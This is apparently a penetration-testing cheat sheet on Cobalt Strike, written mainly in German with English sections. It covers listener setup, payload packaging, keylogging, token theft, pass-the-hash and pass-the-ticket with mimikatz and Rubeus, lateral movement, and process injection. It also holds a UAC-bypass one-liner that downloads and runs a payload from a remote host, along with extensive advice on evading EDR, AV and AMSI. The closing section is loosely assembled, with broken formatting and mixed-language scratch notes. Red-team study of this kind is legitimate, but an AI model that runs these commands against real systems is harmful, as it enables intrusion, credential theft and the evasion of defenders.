# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` dann können Sie auswählen, wo Sie hören möchten, welche Art von Beacon verwendet werden soll (http, dns, smb...) und mehr.

### Peer2Peer Listeners

Die Beacons dieser Listener müssen nicht direkt mit dem C2 kommunizieren, sie können über andere Beacons mit ihm kommunizieren.

`Cobalt Strike -> Listeners -> Add/Edit` dann müssen Sie die TCP- oder SMB-Beacons auswählen.

* Der **TCP-Beacon wird einen Listener im ausgewählten Port einrichten**. Um sich mit einem TCP-Beacon zu verbinden, verwenden Sie den Befehl `connect <ip> <port>` von einem anderen Beacon.
* Der **smb-Beacon wird in einem Pipename mit dem ausgewählten Namen hören**. Um sich mit einem SMB-Beacon zu verbinden, müssen Sie den Befehl `link [target] [pipe]` verwenden.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** für HTA-Dateien
* **`MS Office Macro`** für ein Office-Dokument mit einem Makro
* **`Windows Executable`** für eine .exe, .dll oder Dienst .exe
* **`Windows Executable (S)`** für eine **stageless** .exe, .dll oder Dienst .exe (besser stageless als staged, weniger IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Dies wird ein Skript/executables generieren, um den Beacon von Cobalt Strike in Formaten wie: bitsadmin, exe, powershell und python herunterzuladen.

#### Host Payloads

Wenn Sie bereits die Datei haben, die Sie auf einem Webserver hosten möchten, gehen Sie einfach zu `Attacks -> Web Drive-by -> Host File` und wählen Sie die Datei aus, die Sie hosten möchten, sowie die Webserver-Konfiguration.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Führen Sie lokale .NET-Binärdatei aus
execute-assembly </path/to/executable.exe>
# Beachten Sie, dass zum Laden von Assemblies, die größer als 1 MB sind, die Eigenschaft 'tasks_max_size' des veränderbaren Profils geändert werden muss.

# Screenshots
printscreen    # Machen Sie einen einzelnen Screenshot über die PrintScr-Methode
screenshot     # Machen Sie einen einzelnen Screenshot
screenwatch    # Machen Sie periodische Screenshots des Desktops
## Gehen Sie zu Ansicht -> Screenshots, um sie zu sehen

# keylogger
keylogger [pid] [x86|x64]
## Ansicht > Tastenanschläge, um die gedrückten Tasten zu sehen

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Fügen Sie die Portscan-Aktion in einen anderen Prozess ein
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Importieren Sie das Powershell-Modul
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <schreiben Sie hier einfach den Powershell-Befehl> # Dies verwendet die höchste unterstützte Powershell-Version (nicht oppsec)
powerpick <cmdlet> <args> # Dies erstellt einen opfernden Prozess, der durch spawnto angegeben wird, und injiziert UnmanagedPowerShell darin für bessere opsec (nicht protokollierend)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # Dies injiziert UnmanagedPowerShell in den angegebenen Prozess, um das PowerShell cmdlet auszuführen.


# Benutzeridentifikation
## Token-Generierung mit Anmeldeinformationen
make_token [DOMAIN\user] [password] #Erstellen Sie ein Token, um einen Benutzer im Netzwerk zu impersonieren
ls \\computer_name\c$ # Versuchen Sie, das generierte Token zu verwenden, um auf C$ in einem Computer zuzugreifen
rev2self # Stoppen Sie die Verwendung des mit make_token generierten Tokens
## Die Verwendung von make_token erzeugt Ereignis 4624: Ein Konto wurde erfolgreich angemeldet. Dieses Ereignis ist in einer Windows-Domäne sehr häufig, kann jedoch durch Filtern nach dem Anmeldetyp eingegrenzt werden. Wie oben erwähnt, verwendet es LOGON32_LOGON_NEW_CREDENTIALS, was Typ 9 ist.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Token von pid stehlen
## Wie make_token, aber das Token von einem Prozess stehlen
steal_token [pid] # Außerdem ist dies nützlich für Netzwerkaktionen, nicht für lokale Aktionen
## Aus der API-Dokumentation wissen wir, dass dieser Anmeldetyp "es dem Aufrufer ermöglicht, sein aktuelles Token zu klonen". Deshalb sagt die Beacon-Ausgabe Impersonated <current_username> - es impersoniert unser eigenes geklontes Token.
ls \\computer_name\c$ # Versuchen Sie, das generierte Token zu verwenden, um auf C$ in einem Computer zuzugreifen
rev2self # Stoppen Sie die Verwendung des Tokens von steal_token

## Prozess mit neuen Anmeldeinformationen starten
spawnas [domain\username] [password] [listener] #Führen Sie es aus einem Verzeichnis mit Lesezugriff aus, z. B.: cd C:\
## Wie make_token, wird dies Windows-Ereignis 4624 erzeugen: Ein Konto wurde erfolgreich angemeldet, jedoch mit einem Anmeldetyp von 2 (LOGON32_LOGON_INTERACTIVE). Es wird den aufrufenden Benutzer (TargetUserName) und den impersonierten Benutzer (TargetOutboundUserName) detailliert beschreiben.

## In Prozess injizieren
inject [pid] [x64|x86] [listener]
## Aus Sicht der OpSec: Führen Sie keine plattformübergreifende Injektion durch, es sei denn, Sie müssen wirklich (z. B. x86 -> x64 oder x64 -> x86).

## Pass the hash
## Dieser Modifikationsprozess erfordert das Patchen des LSASS-Speichers, was eine hochriskante Aktion ist, lokale Administratorrechte erfordert und nicht sehr praktikabel ist, wenn der geschützte Prozess Light (PPL) aktiviert ist.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash durch mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Ohne /run startet mimikatz eine cmd.exe, wenn Sie als Benutzer mit Desktop ausgeführt werden, wird er die Shell sehen (wenn Sie als SYSTEM ausgeführt werden, sind Sie bereit).
steal_token <pid> #Token von einem durch mimikatz erstellten Prozess stehlen

## Pass the ticket
## Fordern Sie ein Ticket an
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Erstellen Sie eine neue Anmeldesitzung, die mit dem neuen Ticket verwendet werden soll (um das kompromittierte nicht zu überschreiben)
make_token <domain>\<username> DummyPass
## Schreiben Sie das Ticket auf die Angreifer-Maschine von einer Powershell-Sitzung & laden Sie es
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket von SYSTEM
## Generieren Sie einen neuen Prozess mit dem Ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Stehlen Sie das Token von diesem Prozess
steal_token <pid>

## Ticket extrahieren + Ticket übergeben
### Tickets auflisten
execute-assembly C:\path\Rubeus.exe triage
### Interessantes Ticket nach luid dumpen
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Neue Anmeldesitzung erstellen, beachten Sie luid und processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Ticket in der generierten Anmeldesitzung einfügen
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Schließlich das Token von diesem neuen Prozess stehlen
steal_token <pid>

# Lateral Movement
## Wenn ein Token erstellt wurde, wird es verwendet
jump [method] [target] [listener]
## Methoden:
## psexec                    x86   Verwenden Sie einen Dienst, um ein Service EXE-Artefakt auszuführen
## psexec64                  x64   Verwenden Sie einen Dienst, um ein Service EXE-Artefakt auszuführen
## psexec_psh                x86   Verwenden Sie einen Dienst, um eine PowerShell-Einzeile auszuführen
## winrm                     x86   Führen Sie ein PowerShell-Skript über WinRM aus
## winrm64                   x64   Führen Sie ein PowerShell-Skript über WinRM aus
## wmi_msbuild               x64   wmi laterale Bewegung mit msbuild inline c#-Aufgabe (oppsec)


remote-exec [method] [target] [command] # remote-exec gibt keine Ausgabe zurück
## Methoden:
## psexec                          Remote-Ausführung über den Dienststeuerungsmanager
## winrm                           Remote-Ausführung über WinRM (PowerShell)
## wmi                             Remote-Ausführung über WMI

## Um einen Beacon mit wmi auszuführen (es ist nicht im jump-Befehl), laden Sie einfach den Beacon hoch und führen Sie ihn aus
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Durch listener
## Auf dem Metasploit-Host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Auf Cobalt: Listeners > Hinzufügen und das Payload auf Foreign HTTP setzen. Setzen Sie den Host auf 10.10.5.120, den Port auf 8080 und klicken Sie auf Speichern.
beacon> spawn metasploit
## Sie können nur x86 Meterpreter-Sitzungen mit dem ausländischen Listener starten.

# Pass session to Metasploit - Durch Shellcode-Injektion
## Auf dem Metasploit-Host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Führen Sie msfvenom aus und bereiten Sie den multi/handler-Listener vor

## Kopieren Sie die Binärdatei auf den Cobalt Strike-Host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Injizieren Sie den Metasploit-Shellcode in einen x64-Prozess

# Pass Metasploit-Sitzung zu Cobalt Strike
## Generieren Sie stageless Beacon-Shellcode, gehen Sie zu Angriffe > Pakete > Windows Executable (S), wählen Sie den gewünschten Listener aus, wählen Sie Raw als Ausgabetyp und wählen Sie Use x64 payload.
## Verwenden Sie post/windows/manage/shellcode_inject in Metasploit, um den generierten Cobalt Strike-Shellcode zu injizieren.


# Pivoting
## Öffnen Sie einen Socks-Proxy im Teamserver
beacon> socks 1080

# SSH-Verbindung
beacon> ssh 10.10.17.12:22 benutzername passwort</code></pre>

## Opsec

### Execute-Assembly

Die **`execute-assembly`** verwendet einen **opfernden Prozess** unter Verwendung von Remote-Prozessinjektion, um das angegebene Programm auszuführen. Dies ist sehr laut, da zum Injizieren in einen Prozess bestimmte Win-APIs verwendet werden, die jedes EDR überprüft. Es gibt jedoch einige benutzerdefinierte Tools, die verwendet werden können, um etwas im selben Prozess zu laden:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike können Sie auch BOF (Beacon Object Files) verwenden: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

Das Aggressor-Skript `https://github.com/outflanknl/HelpColor` wird den Befehl `helpx` in Cobalt Strike erstellen, der Farben in Befehlen anzeigt, die angeben, ob sie BOFs (grün), ob sie Frok&Run (gelb) und ähnliches sind, oder ob sie ProcessExecution, Injektion oder ähnliches sind (rot). Dies hilft zu wissen, welche Befehle stealthier sind.

### Als Benutzer agieren

Sie könnten Ereignisse wie `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` überprüfen:

- Sicherheits-EID 4624 - Überprüfen Sie alle interaktiven Anmeldungen, um die üblichen Arbeitszeiten zu kennen.
- System-EID 12,13 - Überprüfen Sie die Häufigkeit von Herunterfahren/Starten/Schlafen.
- Sicherheits-EID 4624/4625 - Überprüfen Sie eingehende gültige/ungültige NTLM-Versuche.
- Sicherheits-EID 4648 - Dieses Ereignis wird erstellt, wenn Klartext-Anmeldeinformationen verwendet werden, um sich anzumelden. Wenn ein Prozess es erzeugt hat, hat die Binärdatei möglicherweise die Anmeldeinformationen im Klartext in einer Konfigurationsdatei oder im Code.

Wenn Sie `jump` von Cobalt Strike verwenden, ist es besser, die Methode `wmi_msbuild` zu verwenden, um den neuen Prozess legitimer erscheinen zu lassen.

### Computerkonten verwenden

Es ist üblich, dass Verteidiger seltsame Verhaltensweisen von Benutzern überprüfen und **Dienstkonten und Computerkonten wie `*$` von ihrer Überwachung ausschließen**. Sie könnten diese Konten verwenden, um laterale Bewegungen oder Privilegieneskalationen durchzuführen.

### Stageless Payloads verwenden

Stageless Payloads sind weniger laut als staged, da sie keine zweite Stufe vom C2-Server herunterladen müssen. Das bedeutet, dass sie nach der ursprünglichen Verbindung keinen Netzwerkverkehr erzeugen, was sie weniger wahrscheinlich macht, von netzwerkbasierten Abwehrmaßnahmen erkannt zu werden.

### Tokens & Token Store

Seien Sie vorsichtig, wenn Sie Tokens stehlen oder generieren, da es möglich sein könnte, dass ein EDR alle Tokens aller Threads auflistet und ein **Token, das einem anderen Benutzer** oder sogar SYSTEM im Prozess gehört, findet.

Dies ermöglicht es, Tokens **pro Beacon** zu speichern, sodass es nicht erforderlich ist, dasselbe Token immer wieder zu stehlen. Dies ist nützlich für laterale Bewegungen oder wenn Sie ein gestohlenes Token mehrfach verwenden müssen:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Bei lateralen Bewegungen ist es normalerweise besser, **ein Token zu stehlen, als ein neues zu generieren** oder einen Pass-the-Hash-Angriff durchzuführen.

### Guardrails

Cobalt Strike hat eine Funktion namens **Guardrails**, die hilft, die Verwendung bestimmter Befehle oder Aktionen zu verhindern, die von Verteidigern erkannt werden könnten. Guardrails können so konfiguriert werden, dass sie bestimmte Befehle blockieren, wie `make_token`, `jump`, `remote-exec` und andere, die häufig für laterale Bewegungen oder Privilegieneskalationen verwendet werden.

Darüber hinaus enthält das Repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) auch einige Überprüfungen und Ideen, die Sie in Betracht ziehen könnten, bevor Sie ein Payload ausführen.

### Ticketverschlüsselung

In einem AD seien Sie vorsichtig mit der Verschlüsselung der Tickets. Standardmäßig verwenden einige Tools RC4-Verschlüsselung für Kerberos-Tickets, die weniger sicher ist als AES-Verschlüsselung, und standardmäßig verwenden aktuelle Umgebungen AES. Dies kann von Verteidigern erkannt werden, die nach schwachen Verschlüsselungsalgorithmen überwachen.

### Standardwerte vermeiden

Wenn Sie Cobalt Strike verwenden, haben die SMB-Pipes standardmäßig den Namen `msagent_####` und `"status_####`. Ändern Sie diese Namen. Es ist möglich, die Namen der vorhandenen Pipes von Cobalt Strike mit dem Befehl: `ls \\.\pipe\` zu überprüfen.

Darüber hinaus wird mit SSH-Sitzungen eine Pipe namens `\\.\pipe\postex_ssh_####` erstellt. Ändern Sie es mit `set ssh_pipename "<new_name>";`.

Auch im Post-Exploitation-Angriff können die Pipes `\\.\pipe\postex_####` mit `set pipename "<new_name>"` geändert werden.

In Cobalt Strike-Profilen können Sie auch Dinge wie:

- Vermeidung der Verwendung von `rwx`
- Wie das Verhalten der Prozessinjektion funktioniert (welche APIs verwendet werden) im `process-inject {...}`-Block
- Wie das "fork and run" im `post-ex {…}`-Block funktioniert
- Die Schlafzeit
- Die maximale Größe von Binärdateien, die im Speicher geladen werden sollen
- Der Speicherbedarf und der DLL-Inhalt mit dem `stage {...}`-Block
- Der Netzwerkverkehr

### Umgehung der Speicherüberprüfung

Einige EDRs scannen den Speicher nach bekannten Malware-Signaturen. Cobalt Strike ermöglicht es, die Funktion `sleep_mask` als BOF zu modifizieren, die in der Lage sein wird, die Backdoor im Speicher zu verschlüsseln.

### Lautstarke Prozessinjektionen

Beim Injizieren von Code in einen Prozess ist dies normalerweise sehr laut, da **kein regulärer Prozess normalerweise diese Aktion ausführt und die Möglichkeiten, dies zu tun, sehr begrenzt sind**. Daher könnte es von verhaltensbasierten Erkennungssystemen erkannt werden. Darüber hinaus könnte es auch von EDRs erkannt werden, die das Netzwerk nach **Threads scannen, die Code enthalten, der nicht auf der Festplatte ist** (obwohl Prozesse wie Browser, die JIT verwenden, dies normalerweise haben). Beispiel: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID- und PPID-Beziehungen

Beim Starten eines neuen Prozesses ist es wichtig, eine **reguläre Eltern-Kind**-Beziehung zwischen Prozessen aufrechtzuerhalten, um eine Erkennung zu vermeiden. Wenn svchost.exec iexplorer.exe ausführt, sieht es verdächtig aus, da svchost.exe in einer normalen Windows-Umgebung kein Elternteil von iexplorer.exe ist.

Wenn ein neuer Beacon in Cobalt Strike standardmäßig gestartet wird, wird ein Prozess verwendet, der **`rundll32.exe`** erstellt, um den neuen Listener auszuführen. Dies ist nicht sehr stealthy und kann leicht von EDRs erkannt werden. Darüber hinaus wird `rundll32.exe` ohne Argumente ausgeführt, was es noch verdächtiger macht.

Mit dem folgenden Cobalt Strike-Befehl können Sie einen anderen Prozess angeben, um den neuen Beacon zu starten, wodurch er weniger erkennbar wird:
```bash
spawnto x86 svchost.exe
```
Sie können auch diese Einstellung **`spawnto_x86` und `spawnto_x64`** in einem Profil ändern.

### Proxying Angreifertraffic

Angreifer müssen manchmal in der Lage sein, Tools lokal auszuführen, selbst auf Linux-Maschinen, und den Traffic der Opfer zu dem Tool zu leiten (z.B. NTLM-Relay).

Darüber hinaus ist es manchmal stealthier für den Angreifer, **diesen Hash oder Ticket in seinem eigenen LSASS-Prozess** lokal hinzuzufügen und dann von dort aus zu pivotieren, anstatt einen LSASS-Prozess einer Opfermaschine zu modifizieren.

Sie müssen jedoch **vorsichtig mit dem generierten Traffic** sein, da Sie möglicherweise ungewöhnlichen Traffic (Kerberos?) von Ihrem Backdoor-Prozess senden. Dafür könnten Sie zu einem Browser-Prozess pivotieren (obwohl Sie erwischt werden könnten, wenn Sie sich in einen Prozess injizieren, also denken Sie an eine stealthy Möglichkeit, dies zu tun).
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> Passwort ändern  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# Change powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# Ändere $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#artifact kit  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
